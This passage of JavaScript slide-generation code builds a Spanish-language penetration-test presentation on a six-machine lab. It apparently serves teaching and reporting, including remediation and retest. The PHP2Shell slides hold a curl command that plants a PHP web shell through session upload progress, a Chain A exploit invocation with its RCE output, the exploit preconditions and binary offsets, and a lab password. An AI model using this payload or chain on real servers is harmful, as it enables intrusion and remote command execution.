  notes: "M4. Fabiola expone el Windows heredado: S3, AXFR, signing y el nivel SYSTEM con credenciales admin.",
});

// =====================================================================
// M5
// =====================================================================
machineSlide({
  vm: "M5", role: "Cliente", owner: "M5 · Marco Nina Cruz",
  subtitle: "La estación del usuario y el control gráfico.",
  func: "Estación cliente Windows 10: navegador, SMB, RDP y TightVNC. Es el destino final de la cadena y el impacto sobre el usuario.",
  stack: ["Windows 10 21H2 · 19045", "SMBv1", "RDP sin NLA", "TightVNC 2.8.90", "cliente / Admin13.-"],
  vulns: [
    ["C2", "Clave reutilizada", "8.8", "SMB"],
    ["C4", "VNC sin autenticación", "9.8", "desktop"],
  ],
  did: "VNC sin clave abrió el escritorio; whoami confirmó desktop-dt5f05n\\cliente; se dejó el marcador PWNED-M5.",
  evidence: "F04-008/011 · F05-001 · EV-007-RETEST",
  notes: "M5. Marco expone la estación cliente: VNC sin autenticación, whoami y marcador; M5 queda pendiente de remediación por filtrado.",
});

// =====================================================================
// M6
// =====================================================================
machineSlide({
  vm: "M6", role: "Auditoría", owner: "M6 · Jose Paye Mamani",
  subtitle: "Kali: el punto de partida y la evidencia.",
  func: "Estación de auditoría: no es objetivo. Ejecuta reconocimiento, escaneo, explotación, transferencia de artefactos y captura de evidencia.",
  stack: ["Kali Linux", "nmap · whatweb · wpscan", "nxc · redis-cli · smbclient", "curl · ssh · vncviewer", "FTP de artefactos :2121"],
  vulns: [
    ["—", "No es objetivo del ataque", "—", "auditor"],
  ],
  did: "Se ejecutaron escaneos, PoCs, túneles y capturas; M6 aloja el FTP de artefactos y los logs con SHA256.",
  evidence: "LOG-000-04…08 · EV-000-10/11 · galería de evidencias",
  notes: "M6. Jose expone la estación de auditoría: herramientas, FTP de artefactos y generación de evidencia.",
});

// =====================================================================
// REPARTO PHP2SHELL
// =====================================================================
{
  const s = newSlide();
  header(s, "Reparto", "PHP2Shell en seis partes",
    "Cada integrante expone su máquina y una parte del caso W2.");

  const parts = [
    ["Erick", "M1", "Ficha, CVSS, EPSS y version gate", CYAN],
    ["Doris", "M2", "Precondiciones: NTS, prefork y php.ini", NAVY3],
    ["Rony", "M3", "Offsets reales y servicio 8080", NAVY3],
    ["Fabiola", "M4", "Chain A: session injection", NAVY3],
    ["Marco", "M5", "LFI, comando y explotación", NAVY3],
    ["Jose", "M6", "Evidencia, root por B3/SSH/sudo y retest", NAVY3],
  ];

  parts.forEach((p, i) => {
    const col = i % 2;
    const row = Math.floor(i / 2);
    const x = M + col * 6.15;
    const y = 1.75 + row * 1.45;
    card(s, x, y, 5.9, 1.2, WHITE, BORDER, 0.16);
    badge(s, String(i + 1), x + 0.2, y + 0.32, 0.45, p[3], WHITE, 11);
    txt(s, p[0] + " · " + p[1], {
      x: x + 0.8, y: y + 0.18, w: 4.8, h: 0.24,
      fontSize: 12, bold: true, color: NAVY,
    });
    txt(s, p[2], {
      x: x + 0.8, y: y + 0.55, w: 4.8, h: 0.5,
      fontSize: 9, color: MUTED, lineSpacing: 11,
    });
  });

  txt(s, "La exposición sigue el orden de la cadena: versión → precondiciones → offsets → sesión → LFI → root y retest.", {
    x: M, y: 6.4, w: 12.0, h: 0.3,
    fontSize: 9, italic: true, color: MUTED,
  });

  footer(s, 0);
  s.addNotes("Reparto. Cada uno tiene una parte de PHP2Shell y su máquina. Erick ficha, Doris precondiciones, Rony offsets, Fabiola session injection, Marco LFI/ejecución, Jose root y retest.");
}

// =====================================================================
// 6. METODOLOGÍA
// =====================================================================
{
  const s = newSlide();
  header(s, "Metodología", "Siete fases técnicas + informe final",
    "Cada flecha tiene una puerta de versión: sin comparar instalada, rango y fix, no se avanza.");

  const phases = [
    ["F0", "Alcance", "red · activos"],
    ["F1", "Reconocimiento", "puertos · versiones"],
    ["F2", "Enumeración", "servicios · usuarios"],
    ["F3", "Análisis", "CVE · configuración"],
    ["F4", "Explotación", "PoC · impacto"],
    ["F5", "Remediación", "parche o config"],
    ["F6", "Retest", "antes / después"],
    ["F7", "Informe", "deck · réplica"],
  ];

  phases.forEach((p, i) => {
    const x = 0.55 + i * 1.58;
    const fill = i === 7 ? NAVY : i === 4 ? CYAN : WHITE;
    const line = i === 7 ? NAVY : i === 4 ? CYAN : BORDER;
    s.addShape(pptx.ShapeType.roundRect, {
      x, y: 1.85, w: 1.45, h: 0.95,
      fill: { color: fill },
      line: { color: line, width: 1.2 },
      rectRadius: 0.08,
    });
    txt(s, p[0], {
      x, y: 1.95, w: 1.45, h: 0.26,
      fontSize: 13, bold: true, color: i === 7 || i === 4 ? CYAN_L : CYAN, align: "center",
    });
    txt(s, p[1], {
      x: x + 0.06, y: 2.22, w: 1.33, h: 0.24,
      fontSize: 8.6, bold: true, color: i === 7 || i === 4 ? WHITE : NAVY, align: "center",
    });
    txt(s, p[2], {
      x: x + 0.06, y: 2.48, w: 1.33, h: 0.2,
      fontSize: 7.2, color: i === 7 || i === 4 ? "D7E6F2" : MUTED, align: "center",
    });
    if (i < 7) {
      s.addShape(pptx.ShapeType.line, {
        x: x + 1.45, y: 2.32, w: 0.13, h: 0,
        line: { color: "9DB4C8", width: 1.5, endArrowType: "triangle" },
      });
    }
  });

  txt(s, "VERSION GATE", {
    x: M, y: 3.25, w: 2.0, h: 0.24,
    fontSize: 9, bold: true, color: CYAN, charSpacing: 1.2,
  });

  const gates = [
    ["1", "Versión instalada", "php -v, httpd -V, wp core version,\nsmbd --version, winver"],
    ["2", "Rango vulnerable", "NVD / CVE.org con fecha\ny CVSS declarado"],
    ["3", "Versión que corrige", "comparar instalada contra fix;\nsi es ≥, el CVE no cuenta"],
    ["4", "Decisión", "explotable / versión sí,\ncondiciones verificadas / no aplica"],
  ];
  gates.forEach((g, i) => {
    const x = M + i * 3.08;
    card(s, x, 3.6, 2.88, 1.32, PANEL, BORDER, 0.08);
    badge(s, g[0], x + 0.18, 3.75, 0.38, i === 3 ? NAVY : CYAN, WHITE, 10);
    txt(s, g[1], {
      x: x + 0.68, y: 3.75, w: 2.0, h: 0.22,
      fontSize: 10, bold: true, color: NAVY,
    });
    txt(s, g[2], {
      x: x + 0.18, y: 4.2, w: 2.55, h: 0.6,
      fontSize: 8, color: MUTED, lineSpacing: 10.5,
    });
  });

  card(s, M, 5.2, 12.1, 0.75, NAVY, NAVY, 0.08);
  txt(s, "Regla de oro:  si la instalada es igual o mayor que la que corrige, el CVE no se cuenta como profundidad.", {
    x: M + 0.25, y: 5.2, w: 11.6, h: 0.75,
    fontSize: 11.5, bold: true, color: WHITE, valign: "middle",
  });

  txt(s, "W2 fue el caso donde la versión estaba dentro del rango y el servicio explotado cumplía las condiciones: NTS, prefork y offsets reales. El gate confirmó versión y condiciones antes de ejecutar.", {
    x: M, y: 6.2, w: 11.8, h: 0.5,
    fontSize: 9.5, italic: true, color: MUTED, lineSpacing: 13,
  });

  footer(s, 6);
  s.addNotes("Metodología. Recorrer F0–F7 y detenerse en el version gate. W2 tenía versión vulnerable y el servicio explotado cumplía las condiciones: NTS, prefork y offsets reales.");
}

// =====================================================================
// 7. QUE ES PHP2SHELL
// =====================================================================
{
  const s = newSlide(WHITE, "M1 · Erick Ramos Vera");
  header(s, "Fase 3 · W2 · El caso", "¿Qué es PHP2Shell y por qué importa?",
    "Dos CVE de PHP 8.4.26 que se convierten en una cadena de explotación real.");

  const cols = [
    ["01", "QUÉ ES", [
      "Dos CVE de corrupción de memoria en PHP 8.4.26.",
      "Ejecución remota antes de autenticarse.",
      "Chain A: session injection + LFI.",
      "Resultado: www-data.",
    ], CYAN],
    ["02", "POR QUÉ SE VOLVIÓ VIRAL", [
      "Versión muy extendida en servidores web.",
      "Ataque remoto, pre-auth y de baja complejidad.",
      "PoC reproducible y CVSS 9.8.",
      "La historia de PHP a root se comunica sola.",
    ], AMBER],
    ["03", "CÓMO SE RELACIONA", [
      "Version gate: 8.4.26 < 8.4.27.",
      "Servicio 8080 con NTS y prefork.",
      "Chain A dio www-data.",
      "B3, SSH y sudo dieron root.",
      "Parche 8.4.27 y retest.",
    ], GREEN],
  ];

  cols.forEach((c, i) => {
    const x = M + i * 4.05;
    card(s, x, 1.7, 3.85, 4.35, WHITE, BORDER, 0.1);
    badge(s, c[0], x + 0.2, 1.88, 0.42, c[3], WHITE, 10);
    txt(s, c[1], {
      x: x + 0.72, y: 1.9, w: 2.9, h: 0.45,
      fontSize: 10.5, bold: true, color: NAVY, lineSpacing: 11,
    });
    c[2].forEach((item, j) => {
      txt(s, "•  " + item, {
        x: x + 0.2, y: 2.55 + j * 0.55, w: 3.45, h: 0.48,
        fontSize: 8.6, color: MUTED, lineSpacing: 11,
      });
    });
    if (i === 2) {
      chip(s, "CASO PRINCIPAL", x + 0.2, 5.5, 1.55, "FEF3C7", "92400E", 7.2);
    }
  });

  card(s, M, 6.18, 12.1, 0.62, NAVY, NAVY, 0.12);
  txt(s, "W2 fue el caso principal: RCE pre-auth, CVSS 9.8 y cadena a root. No es solo un CVE: es una cadena.", {
    x: M + 0.22, y: 6.18, w: 9.9, h: 0.62,
    fontSize: 9.2, bold: true, color: WHITE, valign: "middle",
  });
  txt(s, "24 hallazgos · 22 con evidencia", {
    x: 10.2, y: 6.18, w: 2.2, h: 0.62,
    fontSize: 7.8, bold: true, color: CYAN_L, align: "right", valign: "middle",
  });

  footer(s, 14);
  s.addNotes("Qué es PHP2Shell. Explicar los dos CVE, por qué llama la atención y cómo se conecta con la cadena: version gate, servicio 8080, Chain A, www-data, B3/SSH/sudo y retest.");
}

// =====================================================================
// 8. FICHA W2
// =====================================================================
{
  const s = newSlide(WHITE, "M1 · Erick Ramos Vera");
  header(s, "Fase 3 · W2 · Ficha", "PHP2Shell en una página",
    "Dos CVE de corrupción de memoria en PHP 8.4.26, explotables antes de autenticarse.");

  // Panel izquierdo
  card(s, M, 1.7, 7.0, 4.95, WHITE, BORDER, 0.1);
  const fields = [
    ["Máquina", "M1 · 10.10.10.11 · m1-app"],
    ["Servicio", "PHP 8.4.26 en mod_php sobre Apache 2.4.49"],
    ["CVE", "CVE-2026-109618 · CVE-2026-109619"],
    ["CWE", "CWE-416 · CWE-755 · CWE-824"],
    ["Afectadas", "8.4.0–8.4.26 (también 8.2, 8.3, 8.5)"],
    ["Corrige", "PHP 8.4.27"],
    ["Binario", "libphp.so del servidor"],
    ["Exploit", "php2shell-poc (validado)"],
    ["EPSS", "n/d al 2026-10-27: CVE reciente sin puntuación pública"],
    ["Relacionados", "CVE-2026-109619 (misma familia) · CVE-2021-41773 (W3)"],
    ["Estado", "RCE www-data + root por B3/sudo · parcheado 8.4.27"],
  ];
  fields.forEach((f, i) => {
    const y = 1.85 + i * 0.43;
    txt(s, f[0].toUpperCase(), {
      x: M + 0.25, y, w: 1.25, h: 0.2,
      fontSize: 7.4, bold: true, color: CYAN, charSpacing: 0.8,
    });
    txt(s, f[1], {
      x: M + 1.55, y: y - 0.02, w: 5.2, h: 0.36,
      fontSize: i >= 8 ? 8 : 8.8, color: INK,
      fontFace: i === 6 || i === 7 ? "Courier New" : "Arial",
      lineSpacing: 10,
    });
    if (i < fields.length - 1) {
      s.addShape(pptx.ShapeType.line, {
        x: M + 0.25, y: y + 0.36, w: 6.5, h: 0,
        line: { color: "EEF2F6", width: 0.8 },
      });
    }
  });

  // Panel derecho: CVSS
  card(s, 7.95, 1.7, 4.75, 2.25, NAVY, NAVY, 0.1);
  txt(s, "CVSS v3.1", {
    x: 8.2, y: 1.85, w: 2, h: 0.2,
    fontSize: 8, bold: true, color: CYAN_L, charSpacing: 1,
  });
  txt(s, "9.8", {
    x: 8.2, y: 2.05, w: 1.9, h: 0.8,
    fontSize: 46, bold: true, color: WHITE,
  });
  txt(s, "CVE-2026-109618 · crítica", {
    x: 10.0, y: 2.2, w: 2.55, h: 0.3,
    fontSize: 9, color: "D7E6F2",
  });
  txt(s, "RCE pre-auth como www-data", {
    x: 10.0, y: 2.5, w: 2.55, h: 0.5,
    fontSize: 9, color: CYAN_L, lineSpacing: 12,
  });
  s.addShape(pptx.ShapeType.line, {
    x: 8.2, y: 3.02, w: 4.25, h: 0,
    line: { color: "2A5B84", width: 1 },
  });
  txt(s, "8.1  ·  CVE-2026-109619 (v3.1)  /  9.2 en v4.0", {
    x: 8.2, y: 3.13, w: 4.3, h: 0.24,
    fontSize: 8.5, color: "D7E6F2",
  });
  txt(s, "Vector: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", {
    x: 8.2, y: 3.35, w: 4.3, h: 0.2,
    fontSize: 6.8, fontFace: "Courier New", color: CYAN_L,
  });
  txt(s, "No se mezclan métricas: cada ficha declara su versión de CVSS.", {
    x: 8.2, y: 3.6, w: 4.2, h: 0.3,
    fontSize: 7.2, italic: true, color: "A9C4D8", lineSpacing: 9,
  });

  // Impacto
  card(s, 7.95, 4.1, 4.75, 2.55, PANEL, BORDER, 0.1);
  txt(s, "Impacto declarado", {
    x: 8.15, y: 4.22, w: 4.3, h: 0.24,
    fontSize: 10, bold: true, color: NAVY,
  });
  const imp = [
    ["Ejecución remota", "antes de autenticarse"],
    ["Disclosure", "memoria del worker"],
    ["Salto", "acceso a datos de M2"],
  ];
  imp.forEach((it, i) => {
    const y = 4.58 + i * 0.58;
    badge(s, String(i + 1), 8.15, y, 0.32, CYAN, WHITE, 8.5);
    txt(s, it[0], {
      x: 8.6, y: y - 0.01, w: 3.8, h: 0.22,
      fontSize: 9.5, bold: true, color: NAVY,
    });
    txt(s, it[1], {
      x: 8.6, y: y + 0.21, w: 3.8, h: 0.2,
      fontSize: 8, color: MUTED,
    });
  });

  txt(s, "La versión instalada está dentro del rango afectado: el version gate la marca vulnerable antes de tocar el PoC.", {
    x: M, y: 6.78, w: 12.0, h: 0.25,
    fontSize: 8.5, italic: true, color: MUTED,
  });

  footer(s, 8);
  s.addNotes("Ficha. Dos CVE en la misma familia. CVSS 9.8 en v3.1 para el principal y 8.1 para el segundo. Impacto: RCE como www-data y disclosure de memoria. Todo parte de una versión dentro del rango.");
}

// =====================================================================
// 9. VERSION GATE W2
// =====================================================================
{
  const s = newSlide(WHITE, "M1 · Erick Ramos Vera");
  header(s, "Fase 3 · W2 · Version gate", "8.4.26 está dentro del rango; 8.4.27 corrige",
    "La comparación se hace antes del PoC y se documenta con evidencia.");

  // Línea de tiempo
  const y = 2.55;
  s.addShape(pptx.ShapeType.line, {
    x: 1.0, y, w: 10.9, h: 0,
    line: { color: "C9D6E2", width: 3 },
  });
  // Rango vulnerable
  s.addShape(pptx.ShapeType.line, {
    x: 1.4, y: y - 0.32, w: 7.45, h: 0,
    line: { color: AMBER, width: 5 },
  });
  txt(s, "RANGO VULNERABLE · 8.4.0 – 8.4.26", {
    x: 3.4, y: 1.95, w: 4.2, h: 0.22,
    fontSize: 8, bold: true, color: AMBER, align: "center", charSpacing: 0.6,
  });

  const points = [
    { x: 1.4, label: "8.4.0", sub: "inicio del rango", c: "94A3B8" },
    { x: 5.4, label: "8.4.26", sub: "instalada", c: AMBER, big: true },
    { x: 9.4, label: "8.4.27", sub: "corrige", c: GREEN, big: true },
  ];
  points.forEach((p) => {
    s.addShape(pptx.ShapeType.ellipse, {
      x: p.x - 0.13, y: y - 0.13, w: 0.26, h: 0.26,
      fill: { color: p.c },
      line: { color: WHITE, width: 2 },
    });
    txt(s, p.label, {
      x: p.x - 0.75, y: y + 0.28, w: 1.5, h: 0.3,
      fontSize: p.big ? 18 : 12, bold: true, color: p.c, align: "center",
    });
    txt(s, p.sub, {
      x: p.x - 0.75, y: y + (p.big ? 0.62 : 0.58), w: 1.5, h: 0.22,
      fontSize: 8, color: MUTED, align: "center",
    });
  });

  // Tarjetas
  card(s, M, 3.85, 3.8, 1.65, PANEL, BORDER, 0.1);
  txt(s, "INSTALADA", {
    x: M + 0.22, y: 3.98, w: 2.0, h: 0.2,
    fontSize: 8, bold: true, color: CYAN, charSpacing: 1,
  });
  txt(s, "PHP 8.4.26", {
    x: M + 0.22, y: 4.2, w: 3.3, h: 0.3,
    fontSize: 16, bold: true, color: NAVY,
  });
  txt(s, "Dentro del rango afectado. El servicio expuesto corre con NTS y prefork.", {
    x: M + 0.22, y: 4.58, w: 3.3, h: 0.7,
    fontSize: 8.5, color: MUTED, lineSpacing: 11,
  });

  card(s, 4.72, 3.85, 3.8, 1.65, PANEL, BORDER, 0.1);
  txt(s, "CORRIGE", {
    x: 4.94, y: 3.98, w: 2.0, h: 0.2,
    fontSize: 8, bold: true, color: GREEN, charSpacing: 1,
  });
  txt(s, "PHP 8.4.27", {
    x: 4.94, y: 4.2, w: 3.3, h: 0.3,
    fontSize: 16, bold: true, color: NAVY,
  });
  txt(s, "La instalada es menor que el fix: el CVE cuenta como vulnerable.", {
    x: 4.94, y: 4.58, w: 3.3, h: 0.7,
    fontSize: 8.5, color: MUTED, lineSpacing: 11,
  });

  card(s, 8.84, 3.85, 3.86, 1.65, NAVY, NAVY, 0.1);
  txt(s, "DECISIÓN", {
    x: 9.06, y: 3.98, w: 2.0, h: 0.2,
    fontSize: 8, bold: true, color: CYAN_L, charSpacing: 1,
  });
  txt(s, "Versión sí · condiciones verificadas", {
    x: 9.06, y: 4.2, w: 3.4, h: 0.3,
    fontSize: 13.5, bold: true, color: WHITE,
  });
  txt(s, "El servicio cumple las condiciones; la explotación se documenta con evidencia.", {
    x: 9.06, y: 4.58, w: 3.4, h: 0.7,
    fontSize: 8.5, color: "D7E6F2", lineSpacing: 11,
  });

  txt(s, "El gate no dice “hay un CVE”: dice qué versión hay, si está dentro del rango, qué la corrige y qué evidencia lo demuestra.", {
    x: M, y: 5.85, w: 12.0, h: 0.6,
    fontSize: 10, italic: true, color: MUTED, lineSpacing: 14,
  });

  footer(s, 9);
  s.addNotes("Version gate. 8.4.26 está entre 8.4.0 y 8.4.26; el fix es 8.4.27. El servicio expuesto corre con NTS y prefork, así que el gate confirma versión y condiciones antes de explotar.");
}

// =====================================================================
// 10. PRECONDICIONES
// =====================================================================
{
  const s = newSlide(WHITE, "M2 · Doris Apaza Anahua");
  header(s, "Fase 3 · W2 · Precondiciones", "El PoC no corre con cualquier PHP",
    "Seis condiciones que el servicio explotado presenta en producción.");

  const reqs = [
    ["NTS", "Thread Safety disabled", "El servicio corre sin Thread Safety."],
    ["Prefork", "Apache MPM prefork", "El servicio usa MPM prefork."],
    ["display_errors", "On", "El servicio muestra errores en la respuesta."],
    ["memory_limit", "16M", "Límite del proceso PHP del servicio."],
    ["session.upload_progress", "On · cleanup Off", "Vector de la corrupción en el servicio."],
    ["Offsets", "zif_system · zval_ptr_dtor", "Del libphp.so del servidor, no de otro build."],
  ];

  reqs.forEach((r, i) => {
    const col = i % 3;
    const row = Math.floor(i / 3);
    const x = M + col * 4.08;
    const y = 1.75 + row * 1.85;
    card(s, x, y, 3.78, 1.62, WHITE, BORDER, 0.1);
    badge(s, "✓", x + 0.18, y + 0.2, 0.38, GREEN, WHITE, 11);
    txt(s, r[0], {
      x: x + 0.68, y: y + 0.18, w: 3.0, h: 0.24,
      fontSize: 11, bold: true, color: NAVY, fontFace: "Courier New",
    });
    txt(s, r[1], {
      x: x + 0.68, y: y + 0.45, w: 3.0, h: 0.22,
      fontSize: 9.5, bold: true, color: CYAN,
    });
    txt(s, r[2], {
      x: x + 0.2, y: y + 0.8, w: 3.4, h: 0.5,
      fontSize: 8.5, color: MUTED, lineSpacing: 11,
    });
  });

  card(s, M, 5.55, 12.1, 0.75, ICE, ICE, 0.08);
  txt(s, "PoC: comando ≤ 14 bytes   ·   Chain A: sesión compartida + sink LFI (/lfi.php).", {
    x: M + 0.25, y: 5.55, w: 11.6, h: 0.75,
    fontSize: 10.5, bold: true, color: NAVY, valign: "middle",
  });

  txt(s, "Estas condiciones se verificaron con php -i, httpd -V y nm sobre el servicio antes de ejecutar el PoC.", {
    x: M, y: 6.5, w: 11.8, h: 0.3,
    fontSize: 8.8, italic: true, color: MUTED,
  });

  footer(s, 10);
  s.addNotes("Precondiciones. Las seis se verificaron sobre el servicio explotado: NTS, prefork, display_errors, memory_limit 16M, session.upload_progress y offsets del libphp.so real.");
}

// =====================================================================
// 11. SERVICIO EXPLOTADO
// =====================================================================
{
  const s = newSlide(WHITE, "M2 · Doris Apaza Anahua");
  header(s, "Fase 3 · W2 · Servicio", "PHP 8.4.26 en el puerto 8080",
    "El servicio que se explotó: Apache 2.4.49 prefork y PHP 8.4.26 NTS.");

  // Servicio
  card(s, M, 1.72, 7.15, 4.1, PANEL, BORDER, 0.1);
  chip(s, "SERVICIO :8080", M + 0.22, 1.9, 1.75, ICE, NAVY, 7.5);
  txt(s, "PHP 8.4.26 NTS", {
    x: M + 0.22, y: 2.28, w: 5.6, h: 0.34,
    fontSize: 18, bold: true, color: NAVY,
  });
  const service = [
    ["Apache", "2.4.49 · MPM prefork"],
    ["PHP", "8.4.26 NTS · Thread Safety disabled"],
    ["display_errors", "On · memory_limit 16M"],
    ["session.upload_progress", "On · cleanup Off"],
    ["session2.php", "HTTP 200 · sesión compartida"],
  ];
  service.forEach((r, i) => {
    const y = 2.85 + i * 0.55;
    txt(s, r[0], {
      x: M + 0.25, y, w: 2.35, h: 0.22,
      fontSize: 8.8, fontFace: "Courier New", color: INK,
    });
    txt(s, r[1], {
      x: M + 2.7, y, w: 4.1, h: 0.22,
      fontSize: 8.3, color: MUTED,
    });
  });

  // Superficie
  card(s, 8.0, 1.72, 4.7, 4.1, WHITE, CYAN, 0.1);
  chip(s, "SUPERFICIE", 8.22, 1.9, 1.25, ICE, NAVY, 7.5);
  txt(s, "10.10.10.11:8080", {
    x: 8.22, y: 2.28, w: 4.25, h: 0.3,
    fontSize: 15, bold: true, color: NAVY, fontFace: "Courier New",
  });
  const surface = [
    ["index.php", "entrada web"],
    ["session2.php", "sesión compartida"],
    ["lfi.php", "inclusión local"],
    ["/tmp/sess_*", "sesión en disco"],
  ];
  surface.forEach((r, i) => {
    const y = 2.8 + i * 0.62;
    txt(s, r[0], {
      x: 8.25, y, w: 2.2, h: 0.22,
      fontSize: 8.8, fontFace: "Courier New", color: INK,
    });
    txt(s, r[1], {
      x: 10.45, y, w: 2.0, h: 0.22,
      fontSize: 8.2, color: MUTED,
    });
  });

  card(s, M, 5.95, 12.1, 0.72, NAVY, NAVY, 0.08);
  txt(s, "Resultado:  PHP 8.4.26 NTS sobre Apache 2.4.49 prefork, con el php.ini y los offsets del binario real.", {
    x: M + 0.25, y: 5.95, w: 11.6, h: 0.72,
    fontSize: 10.2, bold: true, color: WHITE, valign: "middle",
  });

  footer(s, 11);
  s.addNotes("Servicio explotado. Es PHP 8.4.26 NTS sobre Apache 2.4.49 prefork, publicado en 8080. Presenta display_errors, memory_limit 16M, session.upload_progress y session2.php con HTTP 200. La evidencia es EV-W2-01.");
}

// =====================================================================
// 12. CONFIGURACIÓN Y OFFSETS
// =====================================================================
{
  const s = newSlide(WHITE, "M3 · Rony Churata Huacani");
  header(s, "Fase 3 · W2 · Configuración", "php.ini y offsets del binario real",
    "Los offsets no se copian de Internet: se derivan del libphp.so del servidor M1.");

  // Panel de código
  s.addShape(pptx.ShapeType.roundRect, {
    x: M, y: 1.75, w: 6.35, h: 4.1,
    fill: { color: NAVY },
    line: { color: NAVY, width: 0 },
    rectRadius: 0.08,
  });
  txt(s, "php.ini efectivo · servicio :8080", {
    x: M + 0.3, y: 1.93, w: 5.6, h: 0.22,
    fontSize: 8.5, bold: true, color: CYAN_L, charSpacing: 0.6,
  });
  const code = [
    "memory_limit = 16M",
    "display_errors = On",
    "max_input_vars = 5000",
    "session.upload_progress.enabled = On",
    "session.use_cookies = 1",
    "session.use_strict_mode = 0",
    "session.upload_progress.cleanup = Off",
  ];
  code.forEach((line, i) => {
    txt(s, line, {
      x: M + 0.35, y: 2.35 + i * 0.42, w: 5.7, h: 0.26,
      fontSize: 10, fontFace: "Courier New", color: i === 0 ? CYAN_L : WHITE,
    });
  });
  txt(s, "Verificado con php -i sobre el handler de Apache, no solo por CLI.", {
    x: M + 0.35, y: 5.35, w: 5.6, h: 0.3,
    fontSize: 8, italic: true, color: "A9C4D8",
  });

  // Offsets
  txt(s, "Símbolos y offsets", {
    x: 7.25, y: 1.8, w: 4.9, h: 0.26,
    fontSize: 11.5, bold: true, color: NAVY,
  });
  const offs = [
    ["zif_system", "0x52e6f0", "system() del módulo"],
    ["zval_ptr_dtor", "0x72ffd0", "destructor en la corrupción"],
    ["htdata", "0x6e0d8", "tabla hash reportada"],
  ];
  offs.forEach((o, i) => {
    const y = 2.2 + i * 0.95;
    card(s, 7.25, y, 5.5, 0.78, PANEL, BORDER, 0.08);
    txt(s, o[0], {
      x: 7.42, y: y + 0.1, w: 2.4, h: 0.24,
      fontSize: 10, bold: true, fontFace: "Courier New", color: NAVY,
    });
    txt(s, o[1], {
      x: 9.85, y: y + 0.1, w: 1.3, h: 0.24,
      fontSize: 10, fontFace: "Courier New", color: "0E7490",
    });
    txt(s, o[2], {
      x: 7.42, y: y + 0.4, w: 5.0, h: 0.22,
      fontSize: 8, color: MUTED,
    });
  });

  // Comando nm
  s.addShape(pptx.ShapeType.roundRect, {
    x: 7.25, y: 5.15, w: 5.5, h: 0.95,
    fill: { color: "0B2A4A" },
    line: { color: "0B2A4A", width: 0 },
    rectRadius: 0.06,
  });
  txt(s, "$ nm libphp.so | grep -E 'zif_system|zval_ptr_dtor'", {
    x: 7.42, y: 5.28, w: 5.2, h: 0.22,
    fontSize: 8.5, fontFace: "Courier New", color: CYAN_L,
  });
  txt(s, "000000000052e6f0 t zif_system", {
    x: 7.42, y: 5.52, w: 5.2, h: 0.2,
    fontSize: 8, fontFace: "Courier New", color: WHITE,
  });
  txt(s, "000000000072ffd0 T zval_ptr_dtor", {
    x: 7.42, y: 5.74, w: 5.2, h: 0.2,
    fontSize: 8, fontFace: "Courier New", color: WHITE,
  });

  txt(s, "Un offset de otro build hace fallar el PoC aunque la versión sea la correcta.", {
    x: M, y: 6.4, w: 12.0, h: 0.28,
    fontSize: 8.8, italic: true, color: MUTED,
  });

  footer(s, 12);
  s.addNotes("Configuración y offsets. Enfatizar que los offsets se derivan con nm del libphp.so real. Si se copian de un writeup de Debian, el PoC falla. htdata lo reporta el propio PoC.");
}

// =====================================================================
// 16. W2 · CHAIN A PASO A PASO
// =====================================================================
{
  const s = newSlide(WHITE, "M4 · Fabiola Ancco Rafael");
  header(s, "Fase 3 · W2 · Chain A", "Cómo se convierte la sesión en RCE",
    "Cinco pasos desde session.upload_progress hasta uid=33(www-data).");

  const steps = [
    ["1", "Activar", "session.upload_progress crea /tmp/sess_<id> con el contenido del request."],
    ["2", "Inyectar", "El nombre del campo y el valor introducen código PHP en la sesión."],
    ["3", "Incluir", "El sink LFI (/lfi.php) incluye el archivo /tmp/sess_<id>."],
    ["4", "Ejecutar", "PHP interpreta el código incluido en el contexto del worker."],
    ["5", "Impacto", "id devuelve www-data; se escribe PWNED-M1-www-data."],
  ];
  steps.forEach((st, i) => {
    const x = 0.55 + i * 2.55;
    card(s, x, 1.85, 2.3, 2.35, i === 2 ? "FEF2F2" : WHITE, i === 2 ? "FCA5A5" : BORDER, 0.14);
    badge(s, st[0], x + 0.18, 2.0, 0.45, i === 2 ? RED : NAVY, WHITE, 12);
    txt(s, st[1], {
      x: x + 0.18, y: 2.58, w: 1.95, h: 0.26,
      fontSize: 11.5, bold: true, color: i === 2 ? RED : NAVY,
    });
    txt(s, st[2], {
      x: x + 0.18, y: 2.92, w: 1.95, h: 1.1,
      fontSize: 8.2, color: MUTED, lineSpacing: 11,
    });
    if (i < 4) {
      s.addShape(pptx.ShapeType.line, {
        x: x + 2.3, y: 3.0, w: 0.24, h: 0,
        line: { color: CYAN, width: 2, endArrowType: "triangle" },
      });
    }
  });

  s.addShape(pptx.ShapeType.roundRect, {
    x: M, y: 4.55, w: 12.1, h: 1.15,
    fill: { color: "071A2E" },
    line: { color: "071A2E", width: 0 },
    rectRadius: 0.14,
  });
  txt(s, "python3 chain_a_session_lfi.py --host 10.10.10.11 --port 8080 \\", {
    x: M + 0.25, y: 4.7, w: 11.6, h: 0.22,
    fontSize: 8.8, fontFace: "Courier New", color: CYAN_L,
  });
  txt(s, "  --inject-path /index.php --lfi-path /lfi.php --session-path /tmp --command \"id; hostname\"", {
    x: M + 0.25, y: 4.95, w: 11.6, h: 0.22,
    fontSize: 8.8, fontFace: "Courier New", color: CYAN_L,
  });
  txt(s, "[+] RCE CONFIRMED: uid=33(www-data) gid=33(www-data) groups=33(www-data)", {
    x: M + 0.25, y: 5.25, w: 11.6, h: 0.24,
    fontSize: 9.2, bold: true, fontFace: "Courier New", color: "A7F3D0",
  });

  txt(s, "La cadena se ejecuta desde M1: session injection + inclusión de sesión. Después se escala por B3 → SSH → sudo y se cierra con parche.", {
    x: M, y: 5.95, w: 12.0, h: 0.45,
    fontSize: 8.8, italic: true, color: MUTED, lineSpacing: 12,
  });

  footer(s, 16);
  s.addNotes("Chain A paso a paso. Explicar que session.upload_progress deja el archivo de sesión y el LFI lo incluye. Sin LFI no hay ejecución: esa es la condición que se declara.");
}

// =====================================================================
// W2 · COMANDOS PASO A PASO
// =====================================================================
{
  const s = newSlide(WHITE, "M5 · Marco Nina Cruz");
  header(s, "Fase 3 · W2 · Comandos", "Cinco pasos, comando y explicación",
    "Lo que se teclea en Kali/M1 y lo que debe devolver cada paso.");

  const rows = [
    ["1", "curl -c sid.txt -b sid.txt -F \"PHP_SESSION_UPLOAD_PROGRESS=<?php system($_GET['c']); ?>\" http://10.10.10.11:8080/index.php", "Crea la sesión y deja el archivo /tmp/sess_<sid> con el código inyectado."],
    ["2", "curl -b sid.txt http://10.10.10.11:8080/index.php", "Fuerza el mismo worker y confirma que la sesión persiste."],
